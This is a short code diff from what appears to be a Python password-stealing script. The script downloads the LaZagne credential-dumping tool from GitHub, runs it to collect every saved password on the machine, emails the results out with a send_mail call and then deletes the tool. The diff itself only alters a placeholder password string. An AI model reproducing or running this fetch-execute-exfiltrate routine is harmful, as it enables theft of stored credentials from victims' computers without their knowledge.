@@ -23,5 +23,5 @@ os.chdir(temp_directory)
 download("https://github.com/0x0ff537/LaZagne/releases/download/2.4.4/lazagne.exe")
 command = "lazagne.exe all"
 result = subprocess.check_output(command, shell=True)
-send_mail("emailhere", "passwordhere", result)
+send_mail("emailhere", "passwordheere", result)
 os.remove("lazagne.exe")
